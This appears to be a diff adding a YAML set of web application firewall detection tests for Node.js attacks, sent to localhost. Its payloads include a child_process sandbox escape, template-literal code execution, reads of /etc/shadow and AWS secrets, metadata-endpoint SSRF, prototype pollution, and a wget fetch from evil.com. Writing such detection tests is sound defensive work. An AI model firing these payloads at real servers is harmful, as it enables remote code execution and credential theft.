@@ -1,0 +1,284 @@
+meta:
+  author: "Security Engineer"
+  description: "Node.js Application Attack Detection Tests"
+  enabled: true
+  name: "934-nodejs.yaml"
+tests:
+  - test_id: 934100
+    desc: "Node.js require() injection via URI"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/api/load?module=require('child_process').exec('id')"
+        output:
+          log_contains: "require"
+  - test_id: 934101
+    desc: "Node.js eval() injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/evaluate"
+          data: '{"code":"eval(Buffer.from(\"Y29uc29sZS5sb2coMSk=\",\"base64\").toString())"}'
+        output:
+          log_contains: "eval"
+  - test_id: 934102
+    desc: "Node.js Function() constructor"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/compile"
+          data: "fn=new Function('return global.process.env')()"
+        output:
+          log_contains: "Function"
+  - test_id: 934103
+    desc: "Node.js process.env access"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/debug?var=process.env.AWS_SECRET_ACCESS_KEY"
+        output:
+          log_contains: "process.env"
+  - test_id: 934104
+    desc: "Node.js Buffer overflow patterns"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/alloc"
+          data: '{"size":"Buffer.allocUnsafe(8192)"}'
+        output:
+          log_contains: "Buffer"
+  - test_id: 934105
+    desc: "Node.js __proto__ pollution"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/merge"
+          data: '{"__proto__":{"admin":true}}'
+        output:
+          log_contains: "__proto__"
+  - test_id: 934106
+    desc: "Node.js constructor.constructor"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/api/check?cb=constructor.constructor('return process')()"
+        output:
+          log_contains: "constructor"
+  - test_id: 934107
+    desc: "Node.js vm module escape"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/sandbox"
+          data: '{"code":"this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\")"}'
+        output:
+          log_contains: "constructor"
+  - test_id: 934108
+    desc: "Node.js child_process.exec()"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/run?cmd=child_process.exec('wget http://evil.com/sh')"
+        output:
+          log_contains: "child_process"
+  - test_id: 934109
+    desc: "Prototype pollution via JSON"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/settings"
+          data: '{"constructor":{"prototype":{"isAdmin":true}}}'
+        output:
+          log_contains: "prototype"
+  - test_id: 934110
+    desc: "Template literal injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/greet?name=${process.mainModule.require('child_process').execSync('id')}"
+        output:
+          log_contains: "process.mainModule"
+  - test_id: 934111
+    desc: "setTimeout code execution"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/schedule"
+          data: '{"callback":"setTimeout(()=>require(\"child_process\").exec(\"id\"),1000)"}'
+        output:
+          log_contains: "setTimeout"
+  - test_id: 934112
+    desc: "setInterval code execution"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/cron"
+          data: '{"callback":"setInterval(()=>require(\"fs\").readFileSync(\"/etc/passwd\"),1000)"}'
+        output:
+          log_contains: "setInterval"
+  - test_id: 934113
+    desc: "Node.js fs module arbitrary read"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/read?file=require('fs').readFileSync('/etc/shadow')"
+        output:
+          log_contains: "fs"
+  - test_id: 934114
+    desc: "Node.js os module injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/info?var=require('os').userInfo()"
+        output:
+          log_contains: "os"
+  - test_id: 934115
+    desc: "Node.js path module traversal"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/resolve?p=require('path').resolve('../../etc/passwd')"
+        output:
+          log_contains: "path"
+  - test_id: 934116
+    desc: "Node.js child_process spawnSync"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/execute"
+          data: '{"cmd":"require(\"child_process\").spawnSync(\"sh\",[\"-c\",\"id\"])"}'
+        output:
+          log_contains: "spawnSync"
+  - test_id: 934117
+    desc: "Node.js crypto arbitrary hash"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/hash?data=require('crypto').createHash('md5').update('test').digest('hex')"
+        output:
+          log_contains: "crypto"
+  - test_id: 934118
+    desc: "Node.js http module SSRF"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/fetch?url=require('http').get('http://169.254.169.254/latest/meta-data/')"
+        output:
+          log_contains: "http"
+  - test_id: 934119
+    desc: "Node.js global variables injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/vars?g=global.process.kill(process.pid)"
+        output:
+          log_contains: "global"
